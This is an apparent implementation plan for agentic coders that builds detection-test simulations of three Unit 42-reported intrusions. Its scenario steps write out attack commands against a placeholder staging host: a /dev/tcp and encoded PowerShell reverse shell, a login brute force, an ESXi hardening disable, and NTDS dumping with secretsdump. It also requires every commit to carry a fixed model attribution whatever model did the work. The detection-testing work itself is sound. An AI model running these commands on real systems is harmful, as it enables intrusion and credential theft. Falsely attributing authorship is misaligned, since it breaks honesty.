# Unit 42 Recent-Posts Chains Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Author the three simulations the 2026-10-28 research brief proposes — SIM-MP-035 (BUGSTER AI-assisted cybercrime), SIM-MP-036 (PAN-OS CVE-2026-0257 post-exploitation to hypervisor credential theft), SIM-MP-037 (PHP2Shell post-exploitation validated by the Unit 42 hunting queries) — after pulling forward the four emitter gaps they need, then bind, measure and re-floor.

**Architecture:** Tasks 1–2 extend four existing EAL emitters (NGFW traffic, NGFW threat, GlobalProtect, LLM egress) with optional parameters and one new event pattern each, keeping every safety rule (no block claims, no live adversary endpoints). Tasks 3–5 author one chain each as a scenario YAML + TTP card pair under the archived chain procedure of the 2026-10-27 pass. Task 6 binds the chains into the FY27 crosswalk, the count pins and the threat-report index (backfilling the 12 rows the last pass owed). Task 7 measures `signal_quality`, raises the floors to the measured values, regenerates every derived artifact and runs every gate.

**Tech Stack:** Python 3.11 / Pydantic v2 (emitters, loader), YAML scenarios, JSON TTP cards, stdlib scripts (coverage, validate, crosswalk), pytest.

**Spec:** `docs/superpowers/specs/2026-10-28-unit42-xsiam-recent-posts-research.md` (the three chain designs, §4) argued from `docs/superpowers/specs/2026-10-27-library-signal-expansion-design.md` (§3 definitions, §4.1 S-22..S-27, §5 rules 1–10, §7 rulings). The chain procedure, authoring notes and review checklist of the last pass are reused verbatim from `.superpowers/sdd/_archive/2026-10-27-library-signal-expansion/` (copied into this plan's workspace).

## Global Constraints

- Branch `feature/scenarios-unit42-xsiam-recent` (cut from local `dev` at bfc4ee4); stage by name (`git add <path>`), never `-A`/`.`/`-a`; every commit ends with the trailer line `Co-Authored-By: Claude Mythos 5.1 <noreply@anthropic.com>` **exactly, whatever model the author runs on**; no PR; no push.
- `CORTEXSIM_XSIAM_ALLOW_WRITE` / `CORTEXSIM_XSIAM_ALLOW_DESTRUCTIVE` untouched. No new outbound call in tests: emitter tests stub the HTTP client as the sibling tests do.
- No scenario step may contact adversary infrastructure. A report domain appears in a command only on a DNS-lookup line; a report IP or URL never appears in a command outside an EAL heredoc `params:` block; a report hash never appears on a line with a fetch verb (spec §4.1 S-25/S-26, as tightened in bfc4ee4: the `params:` exemption holds only inside `cat > *.yml <<` heredocs whose parsed `steps[]` all use collector-POST streamer plugins).
- A synthetic log never claims prevention: `ngfw_threat_emitter.action ∈ {alert, allow}` only, for every event pattern.
- Every synthetic leg carries the run host's identity in-band (`src_ip`/`src_host`/`src_user`, `source_ip`, or for the GlobalProtect leg `private_ip: "$SRC_IP"`) so `stitching_key` is shared by every leg (spec §5 rule 3a).
- Core-leg map, verbatim: endpoint = `EDR KOI BROWSER`; network = `NDR`; cloud-identity = `CDR CSPM CLOUD_APP ITDR AI_SPM AI_ACCESS AIRS`; never a leg = `ANALYTICS EMAIL TIM ASM DLP`.
- Indicator vocab: `type ∈ {sha256, sha1, md5, domain, url, ipv4, ipv6, user_agent, ja3, ja4}`, `safe_form ∈ {log_field, dns_lookup, hash_only, wildfire_test_file, eicar}`, `id` matches `^ind-\d{2}$`, values clean (no `[.]`, no `hxxp`), `source_url` on `unit42.paloaltonetworks.com` or `github.com/PaloAltoNetworks/`.
- Numbering: scenarios SIM-MP-035, -036, -037; cards TTP-2026-0194, -0195, -0196; correlation rules CR-MP-0035..0037 (checked 2026-10-28 with `git log --all --diff-filter=A`: no branch has ever added a file in either range). Chain tasks touch only their own two files.
- **Ruling R1 (indicator minimum):** spec §5 rule 7's "≥3 indicators" becomes "every indicator the report publishes that a leg can carry, minimum 3 where the report has 3". SIM-MP-035 carries exactly the 2 IPv4 the report publishes; SIM-MP-037 carries none and says so. Cost if wrong: a chain with fewer enrichment hooks than the rule intended, visible in `indicators[]`.
- **Ruling R2 (SIM-MP-037 is not HQS-countable):** the PHP2Shell post publishes no indicator, so the chain is authored with `indicators: []`, carries tags `unit42`, `stitched-chain`, `hunting-query-validated`, `no-unit42-indicator`, its header states it does not count, and the chain task's coverage check expects `'SIM-MP-037' in stitched_chain_ids` to be **False** and `hq_signals` unchanged. Its value is that the card's XQL detections are the Unit 42 Managed Threat Hunting queries verbatim.
- **Ruling R3 (SIM-MP-036 analogue):** the run host plays the attacker's VPN-connected foothold; the GlobalProtect leg's `private_ip` is `$SRC_IP`, the NGFW leg's `src_ip` is `$SRC_IP`, `stitching_key: src_ip`. The header discloses that in a real intrusion this machine is attacker-owned and unmanaged and that the endpoint leg stands in for the lateral targets' view.
- **Ruling R4 (SIM-MP-035 analogue):** the run host plays the foothold from which the actor's AI-generated tooling runs; the commercial proxy `104.238.38.202` is an outbound destination (the foothold tunnels through it), the actor server `162.243.3.92` is the exfil and C2 destination. The header discloses the analogue.
- **Ruling R5 (emitter gaps pulled forward):** spec §9 backlog items "NGFW emitter `dst_ip` without a domain and `process_name` override", "GlobalProtect session without preceding auth" and "LLM egress providers beyond three" are implemented in Tasks 1–2 because the chains need them; nothing else from §9 moves.
- **Ruling R6 (live page):** the report pages were fetched on 2026-10-28 into `/private/tmp/claude-501/-Users-henry-Github-Github-desktop-cortex-pov-engine--claude-worktrees-xdr-xsiam-efficacy-testing-3cff09/8e3f1198-72cf-4f6d-a4db-e94058dd63c7/scratchpad/u42/<slug>.html`; a chain author copies indicator values from the live page via WebFetch and falls back to that saved copy only if the fetch fails, saying so in the report.
- Every test that pins a rule is observed failing before the rule lands (Gate A).
- Python on the host: `/Users/henry/Github/Github_desktop/cortex-pov-engine/.venv/bin/python`; run pytest from the repo root with `PYTHONPATH=core` (`python -m pytest tests/...`), add `-p no:cacheprovider`.

## Review Focus

1. `ngfw_eal_emitter` with `dst_ip` set alone must blank `dst_hostname` and `url_domain` on the record rather than keep the preset domain — a record naming a preset domain next to the indicator IP would mis-enrich. Test in Task 1.
2. `ngfw_threat_emitter` under `event_pattern: vulnerability_inbound` must still refuse every block-class `action` and must emit no `filedigest` / `verdict` keys — a vulnerability log carrying a WildFire verdict is a shape no tenant produces. Test in Task 1.
3. `globalprotect_emitter` negative control for `gateway_connected_without_auth` must emit the `portal-auth` success with an earlier timestamp than the `gateway-connected` event, else a correct detector fires on the control. Test in Task 1.
4. A `deepseek` / `openrouter` request must carry the fake key as a `Bearer` header, never as a query parameter, and the host authorisation hook must receive `api.deepseek.com` / `openrouter.ai`. Test in Task 2.
5. SIM-MP-037 must not enter `stitched_chain_ids` and must not raise `hq_signals`; the floors Task 7 sets must equal the values measured with it excluded. Asserted in Task 5 Step 4 and Task 7 Step 2.

---

### Task 1: Emitter extensions — NGFW traffic, NGFW threat, GlobalProtect

**Files:**
- Modify: `core/eal_simulator/plugins/ngfw_eal_emitter.py` (`NgfwEalEmitterParams`, `_dst_pair`, record builder ≈ lines 118–175, 275–340)
- Modify: `core/eal_simulator/plugins/ngfw_threat_emitter.py` (`NgfwThreatEmitterParams`, `_EVENT_PATTERNS`, `Meta.detectors`, `build_events`)
- Modify: `core/eal_simulator/plugins/globalprotect_emitter.py` (`_PATTERN_MARKER`, `GlobalProtectParams`, `Meta.detectors`, `build_events`)
- Modify: `docs/reference/eal-plugin-catalog.md` (rows 27 and the GlobalProtect / NGFW-EAL rows; the detail sections for each)
- Test: `tests/eal_simulator/test_plugin_ngfw_eal_emitter.py`, `tests/eal_simulator/test_plugin_ngfw_threat_emitter.py`, `tests/eal_simulator/test_plugin_globalprotect_emitter.py` (create if absent)

**Interfaces:**
- Consumes: nothing new.
- Produces (chain tasks rely on these exact names):
  - `ngfw_eal_emitter` params: `dst_ip` may be set **without** `dst_domain` (then `dst` = `dst_ip`, `dst_hostname` = `url_domain` = `""`); `dst_domain` without `dst_ip` still raises `dst_domain requires dst_ip`; new `process_name: Optional[str]` (non-empty when set; overrides `process_name` on every record), `dst_port: Optional[int]` (1–65535; overrides `dst_port`), `app: Optional[str]` (non-empty; overrides `app`).
  - `ngfw_threat_emitter`: `event_pattern` gains `vulnerability_inbound`; `file_sha256` and `file_name` become `Optional` and a model validator requires both only when `event_pattern == "wildfire_malicious_file"`; `dst_ip` may be set without `dst_domain` (same blank-domain rule); new `threat_id: int = Field(default=0, ge=0)` (0 marks a synthetic signature), `uri: str = "/index.php"`, `victim_ip: Optional[str]` (dotted quad; the record's `dst`, default `10.0.12.34`), `victim_host: Optional[str]` (the record's `endpoint_device_name`), `dst_port: Optional[int]` (1–65535, default 443). Under `vulnerability_inbound` the record is `{"subtype": "vulnerability", "category": "code-execution", "severity": "critical", "direction": "client-to-server", "src": src_ip or "198.51.100.23", "dst": victim_ip or constant, "src_zone": "untrust", "dst_zone": "trust", "rule": "allow-inbound-web", "threat_id": ..., "threat_name": threat_name or "CortexSim synthetic web-application exploit attempt", "misc": uri, "app": app, "vulnerability_inbound_marker": True, ...}` with **no** `filedigest` / `filetype` / `verdict` / `wildfire_verdict_marker` keys; `action` rule unchanged. `Meta.detectors` gains `{"alert": "Vulnerability threat from a publicly routed source against a web server", "dataset": "panw_ngfw_threat_raw", "key_fields": ["subtype", "src", "threat_id"], "predicate": "subtype=vulnerability AND src is publicly routed", "mitre": "T1190", "undocumented_reason": ...}`; `Meta.mitre_techniques` gains `T1190`.
  - `globalprotect_emitter`: `event_pattern` gains `gateway_connected_without_auth` (marker `gateway_connected_without_auth_marker`); new params `public_ip: Optional[str]` (dotted quad; default `_FAR_IP`), `private_ip: Optional[str]` (dotted quad; default the random `10.20.0.x` the module already uses), `machine_name: str = "DESKTOP-CORTEXSIM"`, `endpoint_mac: str = "02:00:00:00:00:07"` (locally administered). Positive case: one record `{"eventid": "gateway-connected", "stage": "gateway-connected", "status": "success", "srcuser": target_user, "public_ip": ..., "private_ip": ..., "machine_name": ..., "endpoint_mac": ..., "auth_method": "auth-cookie", "preceding_auth_event": "NONE", "gateway_connected_without_auth_marker": True, ...}`. Negative control (`negative_control: true`): two records — a `portal-auth` success for the same user and `public_ip` timestamped 60 s earlier, then the same gateway-connected record with `preceding_auth_event: "portal-auth"`. `Meta.detectors` gains the entry with `negative_control: "the same session preceded by a portal-auth success"` and `mitre: "T1556"`.

- [ ] **Step 1: Write the failing tests** (one file per plugin; names below are the minimum):
  - ngfw_eal: `test_dst_ip_alone_blanks_domain_fields`, `test_dst_domain_alone_rejected`, `test_process_name_override`, `test_process_name_non_empty_when_set`, `test_dst_port_override_and_bounds`, `test_app_override`.
  - ngfw_threat: `test_vulnerability_inbound_record_fields` (subtype, zones, direction, misc, threat_id, marker; asserts `"filedigest" not in rec and "verdict" not in rec`), `test_vulnerability_inbound_needs_no_file_fields`, `test_wildfire_still_requires_file_fields`, `test_vulnerability_inbound_refuses_block` (parametrised over `block deny drop reset-both sinkhole Block`), `test_victim_ip_dotted_quad`, `test_dst_ip_alone_blanks_domain_fields`, `test_manifest_declares_two_detectors`.
  - globalprotect: `test_gateway_connected_without_auth_positive_single_record`, `test_negative_control_emits_portal_auth_first` (asserts the portal-auth timestamp < gateway-connected timestamp and `preceding_auth_event == "portal-auth"`), `test_public_and_private_ip_validated`, `test_machine_name_non_empty`, `test_existing_patterns_unchanged` (the three legacy patterns still produce their legacy record counts).
- [ ] **Step 2: Run them, confirm every new test fails** — `PYTHONPATH=core .venv/bin/python -m pytest tests/eal_simulator/test_plugin_ngfw_eal_emitter.py tests/eal_simulator/test_plugin_ngfw_threat_emitter.py tests/eal_simulator/test_plugin_globalprotect_emitter.py -q -p no:cacheprovider` → the new names FAIL (validation error or `KeyError`), the legacy names pass. Paste the failing names into the report.
- [ ] **Step 3: Implement** per the Interfaces block. Keep `_dst_pair` semantics asymmetric as specified. Do not change `_DATASET` constants (`scripts/check-streamer-fidelity.py` maps one dataset per emitter).
- [ ] **Step 4: Run the three files, then the EAL suite** — `PYTHONPATH=core .venv/bin/python -m pytest tests/eal_simulator -q -p no:cacheprovider` → all pass, output pristine; `make check-streamer` → green.
- [ ] **Step 5: Catalog** — update the three plugin rows and detail sections in `docs/reference/eal-plugin-catalog.md` (new params and pattern names only; no count change).
- [ ] **Step 6: Commit** — `git add core/eal_simulator/plugins/ngfw_eal_emitter.py core/eal_simulator/plugins/ngfw_threat_emitter.py core/eal_simulator/plugins/globalprotect_emitter.py tests/eal_simulator/test_plugin_ngfw_eal_emitter.py tests/eal_simulator/test_plugin_ngfw_threat_emitter.py tests/eal_simulator/test_plugin_globalprotect_emitter.py docs/reference/eal-plugin-catalog.md && git commit -m "feat(eal): NGFW dst_ip-only/process overrides, inbound vulnerability threat log, GP session without auth"`

---

### Task 2: `llm_provider_egress` — DeepSeek and OpenRouter providers

**Files:**
- Modify: `core/eal_simulator/plugins/llm_provider_egress.py` (`_DEFAULT_MODELS`, `_Provider`, `_PROVIDERS`, the `provider` Field description, `Meta.description` if it lists providers)
- Modify: `docs/reference/eal-plugin-catalog.md` (row 10 and §10 detail: provider list)
- Test: `tests/eal_simulator/test_plugin_llm_provider_egress.py`

**Interfaces:**
- Produces: `provider ∈ {openai, anthropic, gemini, deepseek, openrouter}`. `_Provider` gains `wire: str = "openai"` (`"openai" | "anthropic" | "gemini"`): `build_headers` / `build_body` branch on `wire`, not `name`, so OpenAI-compatible providers share one shape. `deepseek`: `base_url="https://api.deepseek.com"`, `path="/chat/completions"`, wire openai, default model `deepseek-chat`, fake key `sk-cortexsim-canary-NOT-A-REAL-KEY`. `openrouter`: `base_url="https://openrouter.ai"`, `path="/api/v1/chat/completions"`, wire openai, default model `deepseek/deepseek-chat`, fake key `sk-or-v1-cortexsim-canary-NOT-A-REAL-KEY`. `host()` returns `api.deepseek.com` / `openrouter.ai`.

- [ ] **Step 1: Write the failing tests** — rename `test_three_providers_registered` to `test_five_providers_registered`; add `test_deepseek_url_headers_body` (Bearer header, no key in URL, body `model == "deepseek-chat"`), `test_openrouter_url_headers_body`, `test_deepseek_request_url_and_body` and `test_openrouter_request_url_and_body` (transport tests cloned from `test_openai_request_url_and_body`, stubbed client), `test_authorise_receives_provider_host` for both (the `ctx.authorise` hook gets `api.deepseek.com` / `openrouter.ai`).
- [ ] **Step 2: Run, confirm the new tests fail** (`provider must be one of [...]`). Paste names into the report.
- [ ] **Step 3: Implement** per Interfaces; keep the three legacy providers byte-identical in behaviour (their existing tests are the guard).
- [ ] **Step 4: Run** `PYTHONPATH=core .venv/bin/python -m pytest tests/eal_simulator/test_plugin_llm_provider_egress.py tests/eal_simulator/test_plugins.py -q -p no:cacheprovider` → pass, pristine.
- [ ] **Step 5: Catalog** row 10 + §10: "OpenAI/Anthropic/Gemini/DeepSeek/OpenRouter".
- [ ] **Step 6: Commit** — `git add core/eal_simulator/plugins/llm_provider_egress.py tests/eal_simulator/test_plugin_llm_provider_egress.py docs/reference/eal-plugin-catalog.md && git commit -m "feat(eal): llm_provider_egress gains deepseek and openrouter providers"`

---

### Chain tasks 3–5 (one per research-brief §4 row; identical procedure, different brief)

The procedure is `chain-procedure.md` in this plan's workspace (copied from the 2026-10-27 archive; read it together with `chain-authoring-notes.md` and the Global Constraints above — the rulings R1–R6 amend it). Each chain task creates exactly two files and touches nothing else. The research record for chain *NN* is `scratchpad/lib/chains/<NN>.json`; valid UC/TC ids are `scratchpad/lib/uc-tc-ids.csv`, valid POV scenario ids `scratchpad/lib/pov-scenario-ids.csv` (absolute paths in the notes). Verification is the procedure's four commands plus the pattern-specific line in each row. Commit message `feat(scenarios): SIM-MP-0NN <actor> stitched chain (Unit 42)`.

### Task 3: SIM-MP-035 / TTP-2026-0194 — BUGSTER "Next Exploit Opportunities" (AI-assisted cybercrime)

Report `https://unit42.paloaltonetworks.com/ai-assisted-cybercrime-analysis/` (2026-10-21). Tags `unit42`, `stitched-chain`, `actor:bugster`, `ai-assisted`. Linux primary. `cgo_anchor: {image_name: python3, primary_username: www-data}`; identity `www-data` on the foothold steps (Ruling R4 analogue in the header). Legs **EDR + NDR + AI_ACCESS** (three), `required_planes_in_incident: [EDR, NDR, AI_ACCESS]`, `stitching_key: src_host`, `correlation_window_seconds` ≤ 3600. Indicators (both `ipv4`, `safe_form: log_field`, values copied from the live IOC section): `ind-01` the actor server (Hermes Agent, C2 listener, Cursor proxy), `ind-02` the commercial proxy. Steps (≥8, each real):
1. Root, EDR — AI-generated reconnaissance: `python3` writes the structured enumeration report to `/tmp/cortexsim-mp-035/recon/` and fetches `http://${STAGE_HOST:-127.0.0.1}/wp-json/wp/v2/posts?per_page=100&_fields=author,author_name` and `/wp-sitemap-users-1.xml` (author sitemap) with a `python-requests` user agent (T1595.002 / T1589.002). Detection BIOC + XQL on the lineage.
2. EDR — generated brute-force tool: `python3` POSTs `log=<user>&pwd=<pw>` to `http://${STAGE_HOST}/wp-login.php` for a capped matrix (≤60 attempts, 0.1 s apart) and records the candidate credential file (T1110.001). Detection ABIOC/BIOC (scripted credential burst from a host).
3. NDR, EAL — `ngfw_eal_emitter` sessions from `$SRC_IP` to `ind-02` (`dst_ip` alone, `dst_port: 3128`, `app: http-proxy`, `process_name: python3`), the proxy the brute force tunnels through. Detection NDR + IOC on ind-02.
4. EDR — database dump: `mongodump --host ${STAGE_HOST} --port 27017 --out /tmp/cortexsim-mp-035/dump` when present, else a `python3` socket probe of `${STAGE_HOST}:27017` that writes the same `manifest.json` (admin credential obtained, record counts, exposed infrastructure) — never marker-only (T1005 / T1213).
5. EDR — staging: `tar -czf /tmp/cortexsim-mp-035/exfil/records.tar.gz` of the dump (T1560.001).
6. NDR, EAL — bulk upload to `ind-01` (`dst_ip` alone, `dst_port: 8080`, `app: web-browsing`, large `bytes_sent`, `process_name: python3`) (T1041). Detection NDR analytics + IOC on ind-01.
7. EDR — reverse shell: linux `bash -c 'exec 3<>/dev/tcp/${STAGE_HOST:-127.0.0.1}/4444 ...'` (fails closed on a lab host, lineage is real) with `platform_variants.windows` = a VBScript launcher (`wscript.exe //B`) starting `powershell.exe -nop -w hidden -EncodedCommand <base64>` whose decoded script connects `$env:STAGE_HOST:4444` via `Net.Sockets.TCPClient` (T1059.001 / T1059.005); `platforms: [linux, windows]`.
8. NDR, EAL — `ngfw_eal_emitter` beacon sessions to `ind-01` (`dst_port: 4444`, `process_name: powershell.exe`).
9. AI_ACCESS, EAL — `llm_provider_egress` `provider: deepseek`, `payload_type: jailbreak` (the actor's safety-override prompt), 3 iterations (T1567 / AI misuse); second campaign `provider: openrouter`, `payload_type: benign`, 1 iteration (the GLM experiments). Detection AI_ACCESS (jailbreak attempt to an unsanctioned GenAI provider).
10. ANALYTICS — correlation terminal `CR-MP-0035` on `src_host` across the EDR/NDR/AI_ACCESS legs within the window (the exemplar chains' terminal shape; not marker-only).
Card: BIOC/XQL/ABIOC per detection_id; `iocs[]` = the two IPv4 with `source_url`/`published: "2026-10-21"`/`safe_form`; datasets `xdr_data`, `panw_ngfw_traffic_raw`, `xsiam_incidents` only. Coverage line: `'SIM-MP-035' in stitched_chain_ids` → True.

### Task 4: SIM-MP-036 / TTP-2026-0195 — CVE-2026-0257 post-exploitation to hypervisor credential theft

Report `https://unit42.paloaltonetworks.com/active-exploitation-of-pan-os-cve-2026-0257/` (updated 2026-10-20). Tags `unit42`, `stitched-chain`, `actor:spikey-scorpius`, `actor:tarnished-scorpius`, `ransomware-precursor`. Linux primary with `platform_variants.windows` on steps 3–5; `push_supported` stays default (POSIX commands on every step). `cgo_anchor: {image_name: bash, primary_username: root}` (the attacker's shell on the foothold owns the chain, as SIM-TIM-006 does; the header explains). Legs **ITDR + EDR + NDR**, `required_planes_in_incident: [ITDR, EDR, NDR]`, `stitching_key: src_ip` (Ruling R3), `correlation_window_seconds` ≤ 7200. Indicators: the six "Indicators of the Activity" IPv4 **not** carried by SIM-ITDR-012 / SIM-TIM-006 (`104.207.144.154`, `146.19.216.120`, `146.19.216.125`, `179.43.172.213`, `198.12.106.60`, `202.144.192.47` — confirm each against the live page), all `ipv4` / `log_field`, `surfaces_in` the GlobalProtect steps. The header links SIM-ITDR-012 as the precursor and states the NDR leg is un-enrichable (the report's IPs are inbound sources). Steps (≥8):
1. Root, ITDR, EAL — `globalprotect_emitter` `event_pattern: gateway_connected_without_auth`, `public_ip: <ind-01>`, `private_ip: "$SRC_IP"`, `machine_name: DESKTOP-GP01`, `endpoint_mac: "00:11:22:33:44:55"`, `target_user` a lab principal (T1190 / T1556). Detection ITDR BIOC (gateway-connected with no preceding auth), IOC.
2. ITDR, EAL — a second campaign cycling the remaining five IPs as `public_ip` (one record each; five short heredoc campaigns or one step with five `python3 -m scripts.eal_simulator.cli run` invocations), `preceding_auth_event: NONE` each. Detection ITDR XQL hunt (sessions from published exploitation IPs).
3. EDR — RMM staging: fetch an installer-shaped file from `${STAGE_HOST}` to `/tmp/cortexsim-mp-036/rmm/` and execute it (linux: a shell stub named like the RMM agent; windows variant: `ScreenConnect.ClientSetup.exe`-shaped launch) (T1219).
4. EDR — internal reconnaissance from the foothold: `ip neigh`, `arp -a`, a `nc -zv ${STAGE_HOST} 445 3389 443 22 9401` sweep, `smbclient -L //${STAGE_HOST} -N` when present; windows variant `nltest /dclist:`, `net view`, `Test-NetConnection` (T1018 / T1046 / T1135).
5. EDR + NDR — lateral: `smbclient //${STAGE_HOST}/C$ -N -c ls` and an RDP connect attempt (`xfreerdp` when present else `nc -zv ${STAGE_HOST} 3389`); windows variant `mstsc /v:` + `net use`; plus `ngfw_eal_emitter` sessions `src_ip: "$SRC_IP"` → preset RFC1918 destinations with `dst_port: 3389 / 445`, `app: ms-rdp / ms-ds-smb`, `process_name` set (T1021.001 / T1021.002).
6. EDR + NDR — vCenter pivot: `curl -sk -X POST https://${STAGE_HOST}/rest/com/vmware/cis/session` then `ssh -o BatchMode=yes -o ConnectTimeout=3 root@${STAGE_HOST} 'esxcli system settings advanced set -o /VMkernel/Boot/execInstalledOnly -i 0'` (fails closed; the command line is the detection key) (T1021.004 / T1562.001); NGFW sessions to a preset vCenter/ESXi destination, `dst_port: 443 / 22`.
7. EDR — offline credential dump: fetch `https://${STAGE_HOST}/folder/DC01/DC01-flat.vmdk?dcPath=Datacenter&dsName=datastore1` into `/tmp/cortexsim-mp-036/vmdk/` (404 on a lab host; then `dd` a 4 MiB placeholder so the next command has a file), carve with `7z l`/`python3`, then run the offline-parse shape `secretsdump.py -ntds /tmp/cortexsim-mp-036/vmdk/ntds.dit -system /tmp/cortexsim-mp-036/vmdk/SYSTEM LOCAL` via `external_tools[].adapter_ref: TOOL-IMPACKET` (fails on placeholder input; lineage real) (T1003.003 / T1006). Detection EDR BIOC/ABIOC.
8. EDR + NDR — Veeam: `nc -zv ${STAGE_HOST} 9401` + a `curl` to the Veeam Backup Service port with the CVE-2023-27532 request shape; NGFW session `dst_port: 9401` (T1190). Detection NDR (backup-server port from a VPN host).
9. ANALYTICS — `CR-MP-0036` joins the GlobalProtect `private_ip`, the NGFW `src`, and the EDR host within the window.
Card: `iocs[]` = six IPv4 with `published: "2026-10-20"`; datasets `panw_ngfw_globalprotect_raw`, `xdr_data`, `panw_ngfw_traffic_raw`, `xsiam_incidents`. Coverage line → True.

### Task 5: SIM-MP-037 / TTP-2026-0196 — PHP2Shell post-exploitation validated by the Unit 42 hunting queries

Report `https://unit42.paloaltonetworks.com/cve-2026-109618-cve-2026-109619/` (2026-10-23, updated 25 Oct). Tags per Ruling R2; `actor:unattributed`. Linux only. `cgo_anchor: {image_name: php-fpm, primary_username: www-data}`; identity `www-data` on every agent step. Legs **EDR + NDR**, `required_planes_in_incident: [EDR, NDR]`, `stitching_key: src_host`, `indicators: []`. The verbatim hunting-query text is at `/private/tmp/claude-501/-Users-henry-Github-Github-desktop-cortex-pov-engine--claude-worktrees-xdr-xsiam-efficacy-testing-3cff09/8e3f1198-72cf-4f6d-a4db-e94058dd63c7/scratchpad/u42/php2shell-mth-queries.txt` (two queries, each rendered twice on the page: `dataset = xdr_data` and `dataset = panw_ngfw_threat_raw`). The header states: no Unit 42 indicator, not HQS-countable; the xdr_data query excludes downloads from `localhost`/`127.0.0.1`, so with the default `STAGE_HOST` only the recon, staging and tmp-execution signals score. Steps (≥7):
1. Root, EDR — recon burst under the PHP worker: `php-cgi -r 'system("id -un; uname -a; hostname; cat /etc/passwd; ps -ef; ip addr");'` when `php-cgi` exists, else `sh -c` of the same list (the query's third anchor — `www-data` outside an interactive session — still matches) (T1082 / T1087).
2. EDR — download-to-file: `curl -fsSL -o /tmp/cortexsim-mp-037/stage/.x http://${STAGE_HOST:-127.0.0.1}/x` with `wget -O` fallback; the file is created even on 404 (`: > …`) (T1105).
3. EDR — staging: `chmod +x /tmp/cortexsim-mp-037/stage/.x` (T1222.002).
4. EDR — execution from a memory-backed directory: copy to `/dev/shm/.cache/x` and execute (a shell stub printing its own pid), then the memfd shape via `python3` `os.memfd_create` + `os.execv` of the stub (T1620 / T1059.004).
5. EDR — the query's payload-transfer alternates: `certutil`-free Linux equivalents are `curl` with `--remote-name` and `wget` to a file — one step exercising the second download shape to a non-loopback `${STAGE_HOST}` only when the operator sets it (`[ "${STAGE_HOST:-127.0.0.1}" != 127.0.0.1 ] && …`; else the step logs why and still runs the loopback form).
6. NDR, EAL — `ngfw_threat_emitter` `event_pattern: vulnerability_inbound`, `victim_ip: "$SRC_IP"`, `victim_host: "$SRC_HOST"`, `threat_name: "PHP2Shell CVE-2026-109618 remote code execution attempt (CortexSim synthetic)"`, `uri: "/index.php"`, `src_ip` left at the preset public source, `action: alert` (T1190). Detection NDR XQL = the Unit 42 NGFW query verbatim.
7. ANALYTICS — `CR-MP-0037`: inbound vulnerability threat against host H followed within the window by PHP-worker post-exploitation signals on H.
Card: `xql_queries[]` carries the two Unit 42 queries **verbatim** (one per dataset) plus BIOCs per scored signal; `iocs: []`; `references[0]` the report, `references[1]` the Palo Alto Networks security advisory if the page links one; datasets `xdr_data`, `panw_ngfw_threat_raw`, `xsiam_incidents`. Coverage line → **False** for `stitched_chain_ids`, `hq_signals` unchanged from the Task 4 value (record both numbers).

---

### Task 6: Bind the chains into the crosswalk, the count pins and the threat-report index

**Files:**
- Modify: `scripts/uctc_crosswalk_v2.2.py` (3 `CROSSWALK` rows in the multi-plane block, mirroring each scenario's `tc_refs[]`)
- Modify: `docs/uc_tc_mapping/crosswalk-v2.2.csv` and the xlsx via `python3 scripts/uctc_crosswalk_v2.2.py --emit --emit-xlsx`
- Modify: `tests/api/test_uctc_index.py` (189 → 192, dated docstring line; re-measure `evidenced` and bump with a dated comment if a newly bound TC was unevidenced), `tests/engine/test_corpus_refs_strict.py` (189 → 192)
- Modify: `docs/threat_report_index.md` (rows for SIM-MP-023..037 — 15 rows, title / Unit 42 / year / scenario id from each scenario's `threat_report` and `threat_report_url` — and one line under the table: "N scenarios cite a Unit 42 report; this table lists M" computed with `grep -rl 'threat_report_url: "https://unit42' scenarios | wc -l`)

- [ ] **Step 1: Run the two count tests, confirm they fail at 189.**
- [ ] **Step 2: Add the rows; emit; bump the pins; backfill the index.**
- [ ] **Step 3: Verify** — `python3 scripts/uctc_crosswalk_v2.2.py --report` shows 192 rows / 0 unresolved; `make check-uctc-sheet` green; `PYTHONPATH=core .venv/bin/python -m pytest tests/api/test_uctc_index.py tests/engine/test_corpus_refs_strict.py -q -p no:cacheprovider` passes.
- [ ] **Step 4: Commit** — `git add scripts/uctc_crosswalk_v2.2.py docs/uc_tc_mapping/crosswalk-v2.2.csv docs/uc_tc_mapping/*.xlsx tests/api/test_uctc_index.py tests/engine/test_corpus_refs_strict.py docs/threat_report_index.md && git commit -m "feat(uctc): bind SIM-MP-035..037 into the v2.2 crosswalk; backfill the threat-report index"`

---

### Task 7: Measure, raise the floors, regenerate derived artifacts and docs, run every gate

**Files:**
- Modify: `detection_scanner/scripts/coverage_report.py` (`default_config`: `hq_signal_floor`, `stitched_chain_floor`, `marker_only_ceiling` = measured values, rounded down / up respectively)
- Modify: `docs/reference/ground-truth.json`, `docs/reference/ground-truth.md` (regenerated), `detection_scanner/exports/` (regenerated), the golden push-bundle digest file `tests/engine/test_push_generator_invariant.py` points at (regenerated the way its docstring says)
- Modify: `README.md`, `CLAUDE.md`, `docs/reference/README.md`, `docs/reference/scenario-catalog.md` (header counts), `docs/reference/eal-plugin-catalog.md` (provider / pattern mentions only), `CHANGELOG.md` (entry under Unreleased), `docs/superpowers/specs/2026-10-28-unit42-xsiam-recent-posts-research.md` (§4 status line: authored, measured numbers)

- [ ] **Step 1: Measure** — `coverage_report.py --json` → record `signal_quality` (expect `stitched_chains` 13, SIM-MP-037 absent from the list); `scripts/generate_ground_truth.py`.
- [ ] **Step 2: Floors** — set to measured; `coverage_report.py --strict` → exit 0; `--hq-signal-floor <measured+1>` → exit 1 (the gate can go red); restore.
- [ ] **Step 3: Docs** — 189 → 192 scenarios, 187 → 190 cards, EAL plugins stay 27 (new patterns/providers named), one paragraph with the measured `signal_quality` under the "Canonical scenario count" note in `CLAUDE.md` and in `docs/reference/README.md`, including the sentence that SIM-MP-037 is authored but not HQS-countable; `tenant-verified` stays 0.
- [ ] **Step 4: Derived artifacts** — `make validate-detection` (exports; `sha256sum -c` must pass), golden digests regenerated and bumped with a dated line.
- [ ] **Step 5: Gates** — `make validate`; `PYTHONPATH=core .venv/bin/python -m pytest tests/ --ignore=tests/smoke --ignore=tests/e2e_isolated -q -p no:cacheprovider`; `PYTHONPATH=core .venv/bin/python -m pytest tests/e2e_isolated -q -p no:cacheprovider`; `cd ui && npx vitest run` (unchanged, once); `make test-agent` (unchanged, once). Record every count.
- [ ] **Step 6: Commit** (two commits: floors + ground truth + derived artifacts; docs) and report the before/after table.
